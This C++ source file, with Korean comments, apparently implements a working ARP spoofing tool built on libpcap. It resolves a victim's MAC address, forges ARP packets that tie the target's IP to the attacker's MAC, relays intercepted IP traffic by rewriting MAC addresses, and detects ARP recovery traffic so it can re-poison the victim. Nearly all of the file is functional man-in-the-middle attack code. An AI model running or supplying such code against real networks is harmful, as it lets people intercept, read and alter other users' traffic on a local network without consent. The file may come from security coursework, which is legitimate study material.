#include "arp_spoofing.h"

// void printPacket(libnet_ethernet_hdr *ethhdr) {
//   if (ethhdr == NULL) return;

//   if (ntohs(ethhdr->ether_type) == EthHdr::Ip4) {
//     auto iphdr = (libnet_ipv4_hdr *)(ethhdr + 1);
//     printf("%s")
//     cout << "ip src : " << inet_ntoa(iphdr->ip_src) << endl;
//     cout << "ip dest : " << inet_ntoa(iphdr->ip_dst) << endl;
//   }
// }

/**
 * @brief 네트워크 인터페이스의 MAC 주소를 확인한다.
 * @ https://tttsss77.tistory.com/138
 *
 * @param[in] ifname        네트워크 인터페이스 이름
 * @param[in] mac_addr      MAC 주소가 저장될 버퍼 (6바이트 길이)
 *
 * @retval  0: 성공
 * @retval  -1: 실패
 */
int ArpSpoofing::getMacByInterface(const char *ifname, uint8_t *mac_addr) {
  struct ifreq ifr;
  int sockfd, ret;

  /*
   * 네트워크 인터페이스 소켓을 연다.
   */
  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sockfd < 0) {
    printf("Fail to get interface MAC address - socket() failed\n");
    return -1;
  }
  /*
   * 네트워크 인터페이스의 MAC 주소를 확인한다.
   */
  strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
  ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
  if (ret < 0) {
    printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed\n");
    close(sockfd);
    return -1;
  }
  memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, Mac::SIZE);

  /*
   * 네트워크 인터페이스 소켓을 닫는다.
   */
  close(sockfd);

  return 0;
}

/**
 * @brief 네트워크 인터페이스의 IP 주소를 확인한다.
 *
 * @param[in] ifname        네트워크 인터페이스 이름
 * @param[in] ip_addr       IP 주소가 저장될 버퍼 (4바이트 길이)
 *
 * @retval  0: 성공
 * @retval  -1: 실패
 */
int ArpSpoofing::getIpByInterface(const char *ifname, uint8_t *ip_addr) {
  struct ifreq ifr;
  int sockfd, ret;

  /*
   * 네트워크 인터페이스 소켓을 연다.
   */
  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sockfd < 0) {
    printf("Fail to get interface IP address - socket() failed\n");
    return -1;
  }

  /*
   * 네트워크 인터페이스의 IP 주소를 확인한다.
   */
  strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
  ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
  if (ret < 0) {
    printf("Fail to get interface IP address - ioctl(SIOCGIFADDR) failed\n");
    close(sockfd);
    return -1;
  }
  memcpy(ip_addr, ifr.ifr_addr.sa_data + 2, Ip::SIZE);

  /*
   * 네트워크 인터페이스 소켓을 닫는다.
   */
  close(sockfd);

  return 0;
}

int ArpSpoofing::getMacByIp(const char *ifname, Ip ip_addr, uint8_t *mac_addr) {
  // get handle
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t *handle = pcap_open_live(ifname, BUFSIZ, 1, 1000, errbuf);
  if (handle == nullptr) {
    fprintf(stderr, "couldn't open device %s(%s)\n", ifname, errbuf);
    return -1;
  }
  // get attacker's ip & mac
  uint8_t attacker_mac[Mac::SIZE];
  if (getMacByInterface(ifname, attacker_mac) < 0) {
    printf("fail to get attacker mac addres\n");
    return -1;
  };

  uint8_t attacker_ip[Ip::SIZE];
  if (getIpByInterface(ifname, attacker_ip) < 0) {
    printf("fail to get attacker ip addres\n");
    return -1;
  };
  // make packet
  EthArpPacket packet;
  packet.eth_.smac_ = Mac(attacker_mac);
  packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
  packet.eth_.type_ = htons(EthHdr::Arp);
  packet.arp_.hrd_ = htons(ArpHdr::ETHER);
  packet.arp_.pro_ = htons(EthHdr::Ip4);
  packet.arp_.hln_ = Mac::SIZE;
  packet.arp_.pln_ = Ip::SIZE;
  packet.arp_.op_ = htons(ArpHdr::Request);
  packet.arp_.smac_ = Mac(attacker_mac);
  packet.arp_.sip_ = htonl(Ip((attacker_ip)));
  packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
  packet.arp_.tip_ = htonl(ip_addr);
  // send packet
  struct pcap_pkthdr *header;
  const u_char *received_packet;
  EthArpPacket *received_EthArpPacket;
  while (true) {
    // sleep(1);
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet),
                              sizeof(EthArpPacket));
    if (res != 0) {
      fprintf(stderr,
              "pcap_sendpacket return %d "
              "error=%s\n",
              res, pcap_geterr(handle));
      return -1;
    }

    res = pcap_next_ex(handle, &header, &received_packet);
    if (res == 0) continue;        // 패킷을 얻지 못함
    if (res == -1 || res == -2) {  // 패킷을 더이상 얻지 못하는 상태
      printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
      break;
    }
    received_EthArpPacket = (EthArpPacket *)received_packet;
    if (htons(received_EthArpPacket->eth_.type_) == EthHdr::Arp) {
      if (ntohl(received_EthArpPacket->arp_.sip_) == ip_addr) {
        memcpy(mac_addr, &received_EthArpPacket->arp_.smac_, Mac::SIZE);
        return 0;
      }
    }
  }
  return -1;
}

EthArpPacket ArpSpoofing::get_arp_packet(Mac attacker_mac, Mac sender_mac,
                                         Ip sender_ip, Ip target_ip) {
  EthArpPacket packet;
  packet.eth_.smac_ = attacker_mac;
  packet.eth_.dmac_ = sender_mac;
  packet.eth_.type_ = htons(EthHdr::Arp);

  packet.arp_.hrd_ = htons(ArpHdr::ETHER);
  packet.arp_.pro_ = htons(EthHdr::Ip4);
  packet.arp_.hln_ = Mac::SIZE;
  packet.arp_.pln_ = Ip::SIZE;
  packet.arp_.op_ = htons(ArpHdr::Request);
  // snoofing
  packet.arp_.smac_ = attacker_mac;
  packet.arp_.sip_ = htonl(target_ip);
  packet.arp_.tmac_ = sender_mac;
  packet.arp_.tip_ = htonl(sender_ip);
  return packet;
}

int ArpSpoofing::attack_arp_spoofing(pcap_t *handle, EthArpPacket packet) {
  int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet),
                            sizeof(EthArpPacket));
  if (res != 0) {
    fprintf(stderr,
            "pcap_sendpacket return %d "
            "error=%s\n",
            res, pcap_geterr(handle));
    return -1;
  }
  return 0;
}

bool ArpSpoofing::check_spoofed_packet(const u_char *packet, Mac sender_mac,
                                       Mac attacker_mac) {
  EthHdr ethhdr = *((EthHdr *)packet);
  if (ethhdr.type() != EthHdr::Ip4) return false;
  if (ethhdr.smac() == sender_mac) {
    return true;
  }
  return false;
}

int ArpSpoofing::relay_spoofed_packet(pcap_t *handle,
                                      struct pcap_pkthdr *header,
                                      const u_char *packet, Mac attacker_mac,
                                      Mac target_mac) {
  if (handle == NULL) {
    printf("handle is empty\n");
    return -1;
  }
  // make packet
  EthIpPacket *ethIpPacket = (EthIpPacket *)packet;
  ethIpPacket->eth_.smac_ = attacker_mac;
  ethIpPacket->eth_.dmac_ = target_mac;
  // send packet
  int res = pcap_sendpacket(handle, packet, header->len);
  if (res != 0) {
    fprintf(stderr,
            "At relay, pcap_sendpacket return %d "
            "error=%s\n",
            res, pcap_geterr(handle));
    return -1;
  }
  return 0;
}

int ArpSpoofing::arp_spoofing(char *ifname, pcap_t *handle, Ip sender_ip,
                              Ip target_ip) {
  int res;

  // get attacker's ip
  uint8_t attacker_ip_arr[Ip::SIZE];
  res = getIpByInterface(ifname, attacker_ip_arr);
  if (res < 0) {
    printf("fail to get attacker's ip\n");
    return -1;
  }
  Ip attacker_ip = Ip(attacker_ip_arr);
  printf("Get attacker's ip(%s)\n", std::string(attacker_ip).c_str());

  // get attacker's mac
  uint8_t attacker_mac_arr[Mac::SIZE];
  res = getMacByInterface(ifname, attacker_mac_arr);
  if (res < 0) {
    printf("fail to get attacker's mac\n");
    return -1;
  }
  Mac attacker_mac = Mac(attacker_mac_arr);
  printf("Get attacker's mac(%s)\n", std::string(attacker_mac).c_str());

  // get sender's mac
  uint8_t sender_mac_arr[Mac::SIZE];
  res = getMacByIp(ifname, sender_ip, sender_mac_arr);
  if (res < 0) {
    printf("fail to get sender's mac\n");
    return -1;
  }
  Mac sender_mac = Mac(sender_mac_arr);
  printf("Get sender's mac(%s)\n", std::string(sender_mac).c_str());

  // packet for arp spoofing
  EthArpPacket packet =
      get_arp_packet(attacker_mac, sender_mac, sender_ip, target_ip);
  printf("Get packet for arp spoofing\n");

  // attack
  res = attack_arp_spoofing(handle, packet);
  if (res < 0) {
    printf("fail to attack arp spoofing\n");
    return -1;
  }
  return 0;
}

int ArpSpoofing::arp_infect(pcap_t *handle, Mac attacker_mac, Mac sender_mac,
                            Ip sender_ip, Ip target_ip) {
  EthArpPacket packet =
      get_arp_packet(attacker_mac, sender_mac, sender_ip, target_ip);
  int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet),
                            sizeof(EthArpPacket));
  if (res < 0) {
    printf("fail to infect\n");
    return -1;
  }
  return 0;
}

bool ArpSpoofing::check_recover_packet(const u_char *received_packet,
                                       Mac sender_mac, Mac target_mac) {
  EthArpPacket packet = *((EthArpPacket *)received_packet);
  if (packet.eth_.type() != EthHdr::Arp) return false;
  if (packet.arp_.op_ != htons(ArpHdr::Request)) return false;
  if (packet.eth_.dmac() == sender_mac || packet.eth_.dmac() == target_mac ||
      packet.eth_.dmac() == Mac("ff:ff:ff:ff:ff:ff")) {
    return true;
  }
  return false;
}
